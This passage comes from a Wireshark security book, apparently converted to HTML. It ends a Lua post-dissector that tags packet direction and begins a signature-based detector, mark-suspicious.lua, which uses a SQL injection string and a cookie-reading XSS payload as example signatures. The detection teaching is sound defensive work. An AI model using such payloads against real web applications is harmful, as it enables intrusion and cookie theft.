style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:28.7500pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >-- define the post-dissector, this is what we use to add new columns</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p></div>
<span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><br clear=all style='page-break-before:always;mso-break-type:section-break'></span>
<div class="Section363" ><p class=MsoNormal  style="margin-top:4.1000pt;margin-right:114.0000pt;margin-left:58.3500pt;text-indent:-21.6000pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >function proto.dissector(buffer, pinfo, tree) local ipsrc = source()</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0500pt;margin-right:0.0000pt;margin-left:58.3500pt;text-indent:0.0000pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >local ipdst = dest()</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.4000pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:11.5000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:50.3500pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >-- if we have an ip source then add our tree calling our direction function</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:58.3500pt;text-indent:0.0000pt;text-align:left;line-height:13.3500pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >if ipsrc ~= nil then</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:79.9500pt;text-indent:0.0000pt;text-align:left;line-height:13.5000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >-- create our TreeItem</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:79.9500pt;text-indent:0.0000pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >local stree = tree:add(proto, 'Direction') stree:add(direction,</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;line-height:13.4000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >getdestination(ipsrc.value,ipdst.value))</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:10.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoBodyText  style="margin-top:0.3500pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:9.0000pt;" ><o:p>&nbsp;</o:p></span></p></div>
<span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:13.0000pt;" ><br clear=all style='page-break-before:auto;mso-break-type:section-break'></span>
<div class="Section364" ><p class=MsoBodyText  style="margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:13.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoBodyText  style="margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:13.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoBodyText  style="margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:13.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoBodyText  style="margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:13.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoBodyText  style="margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;letter-spacing:-0.0500pt;font-size:12.0000pt;" >end</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:5.0000pt;margin-right:0.0000pt;margin-left:26.7500pt;text-indent:0.0000pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:11.0000pt;" ></span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >end</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.3500pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:11.5000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:5.1500pt;text-indent:0.0000pt;text-align:left;line-height:13.5500pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >end</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:59.3500pt;margin-left:5.1500pt;text-indent:0.0000pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >-- register the post-dissector register_postdissector(proto)</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p></div>
<span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:7.0000pt;" ><br clear=all style='page-break-before:auto;mso-break-type:section-break'></span>
<div class="Section365" ><p class=MsoBodyText  style="margin-top:0.4500pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:7.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal  style="margin-top:5.0000pt;margin-right:178.7000pt;margin-left:36.7500pt;text-indent:-28.8000pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >local function Main() register_ipdirection_postdissector()</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:431.7500pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >end Main()</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.3500pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:10.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:11.1500pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Enabling this script is as simple as adding a </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >dofile() </span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >statement to your </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >init .lua</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;letter-spacing:-6.0000pt;font-size:12.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >file. In Linux, this will be at </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >/etc/wireshark/init.lua</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >. In Windows, it will be located at </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >%programfiles%\Wireshark\init.lua</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >. You will want to add the following to the end of that file:</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:12.4500pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >dofile("/path/to/packet-direction.lua")</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:10.5000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoBodyText  style="margin-right:11.1500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >One last manual step is required to make the output of this script graphical. You need to add a column manually and make the contents of the column </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >"direction.direction"</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >. This shows the filter field what was just added using the script visible in the packet list.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.3500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >To add a column in the Wireshark packet list, follow these steps:</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=17  style="margin-top:7.7000pt;margin-right:0.0000pt;margin-bottom:0.0000pt;margin-left:30.5000pt;text-indent:-18.7500pt;text-align:left;mso-list:l2 level1 lfo24;" ><![if !supportLists]><span style="font-family:Georgia;letter-spacing:-0.4500pt;font-size:15.0000pt;" ><span style='mso-list:Ignore;' >1.<span>&nbsp;</span></span></span><![endif]><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Right-click an existing column and click Column</span><span style="mso-spacerun:'yes';font-family:Georgia;letter-spacing:-0.9500pt;font-size:15.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Preferences.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=17  style="margin-top:7.7000pt;margin-right:0.0000pt;margin-bottom:0.0000pt;margin-left:30.5000pt;text-indent:-20.2500pt;text-align:left;mso-list:l2 level1 lfo24;" ><![if !supportLists]><span style="font-family:Georgia;letter-spacing:-0.4500pt;font-size:15.0000pt;" ><span style='mso-list:Ignore;' >2.<span>&nbsp;</span></span></span><![endif]><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Click</span><span style="mso-spacerun:'yes';font-family:Georgia;letter-spacing:-0.1000pt;font-size:15.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Add.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=17  style="margin-top:7.7000pt;margin-right:25.6000pt;margin-bottom:0.0000pt;margin-left:8.0000pt;text-indent:2.2500pt;text-align:left;line-height:145%;mso-list:l2 level1 lfo24;" ><![if !supportLists]><span style="font-family:Georgia;letter-spacing:-0.4500pt;font-size:15.0000pt;" ><span style='mso-list:Ignore;' >3.<span>&nbsp;</span></span></span><![endif]><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Select a Custom field type and direction.direction as Field</span><span style="mso-spacerun:'yes';font-family:Georgia;letter-spacing:-1.9000pt;font-size:15.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Name. After you manually add the available column, you will see your</span><span style="mso-spacerun:'yes';font-family:Georgia;letter-spacing:-1.6500pt;font-size:15.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >new</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p></div>
<span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><br clear=all style='page-break-before:always;mso-break-type:section-break'></span>
<div class="Section366" ><p class=MsoBodyText  style="margin-top:3.7500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >field in the Packet Details pane.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.7000pt;" ><a name="_bookmark662" ></a><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >With the packet-direction script running,<a name="_bookmark663" ></a>&nbsp;</span><span><a href="#_bookmark664" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 8-10</span></u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-size:15.0000pt;" >&nbsp;</span></a></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >shows the field added in the Packet Details pane. See the bottom of </span><span><a href="#_bookmark664" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 8-10</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >, showing only the full Packet List and Packet Details panes.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.2000pt;margin-left:0.0000pt;" ><span><table cellpadding="0"  cellspacing="0" ><tr><td width="120"  height="0" ></td></tr><tr><td></td><td><img width="781"  height="371"  src="Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker.files/Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker457052.png" ></td></tr></table></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:7.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal  style="margin-top:8.5500pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><a name="_bookmark664" ></a><span><a href="#_bookmark663" ><b><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-weight:bold;text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 8-10:</span></u></b><b><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-weight:bold;font-size:15.0000pt;" >&nbsp;</span></b></a></span><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(52,52,52);font-size:15.0000pt;" >Running direction script</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:9.2000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >The post-dissector is demonstrated at the bottom of the Packet Details pane, under the highlighted TCP frame. The post-dissector provides a value of &#8220;direction: incoming&#8221; for the chosen TCP packet.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><h2 style="margin-top:15.1000pt;" ><b><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-size:19.5000pt;" >Marking Suspicious Script</span></b><b><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-size:19.5000pt;" ><o:p></o:p></span></b></h2><p class=MsoBodyText  style="margin-top:9.8500pt;margin-right:11.1500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >While seeing the direction of a packet can certainly help analysis, it is probably not that useful for security-related activities. For an additional Wireshark dissector that can be used by someone in the security industry, we will build a small plug-in that can mark suspicious packets based on a word list. The word list can be adapted for each use case, of course, but for now we will stick with a simple website attack detector. Strings such as </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >' OR 1=1 --</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;letter-spacing:-4.5500pt;font-size:12.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >and</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >&#60;script&#62;alert(document.cookie)&#60;/script&#62; </span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >can be used for this case. The former example would be an attempt at a SQL injection, while the latter string is an example of cross-site scripting (XSS). Either script is strong evidence of malicious behavior and would have no business</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p></div>
<span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><br clear=all style='page-break-before:always;mso-break-type:section-break'></span>
<div class="Section367" ><p class=MsoBodyText  style="margin-top:3.5000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >traveling across your network.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.9500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Note that these example strings of code or script are provided in the beginning of the </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >mark-suspicious </span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >script. The script is only capable of watching for code you teach it to search for. In effect, this script makes Wireshark perform as a signature-based IDS.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.3000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >The next step is searching for those designated code snippets and, if discovered, marking that packet as suspicious.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.6000pt;margin-right:6.3500pt;" ><a name="_bookmark665" ></a><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >The benefit of marking packets, instead of filtering in the packet list, is that you don&#8217;t lose the context of the marked packets. You can manually scroll through the packet data and immediately see suspicious clusters of marked packets, for example, or an attacker checking a site out without a proxy before starting the suspicious activities over an anonymous connection. These things can be picked up by manual inspection but are almost impossible to script, similar to a gut feeling or instinct. Wireshark does the same with fragmented packets and similar protocol errors out of the box, so it is apparent while viewing the packet list that some error occurred without actively searching or filtering for it.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><h3 style="margin-top:7.9000pt;" ><b><span style="mso-spacerun:'yes';font-family:Georgia;font-weight:bold;font-size:15.0000pt;" >mark-suspicious.lua</span></b><b><span style="mso-spacerun:'yes';font-family:Georgia;font-weight:bold;font-size:15.0000pt;" ><o:p></o:p></span></b></h3><p class=MsoNormal  style="margin-top:12.2000pt;margin-right:281.4500pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >-- url decode function function url_decode(str)</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:207.6000pt;margin-left:22.3500pt;text-indent:0.0000pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >str = string.gsub (str, "+", " ") str = string.gsub (str, "%%(%x%x)",</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:52.5000pt;margin-left:22.3500pt;text-indent:28.7500pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >function(h) return string.char(tonumber(h,16)) end) str = string.gsub (str, "\r\n", "\n")</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:388.6000pt;margin-left:8.0000pt;text-indent:14.3500pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >return str end</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:13.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoBodyText  style="margin-top:0.1500pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:10.5000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal  style="margin-top:0.0500pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;line-height:13.5500pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >local function check(packet)</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:66.5500pt;margin-left:65.5500pt;text-indent:-28.8000pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >--[[ this is a trivial (to bypass) example check for a query string that contains an html script element with an alert keyword, indicitive of xss</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:36.7500pt;text-indent:0.0000pt;text-align:left;line-height:13.3000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >--]]</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.3000pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:11.5000pt;" 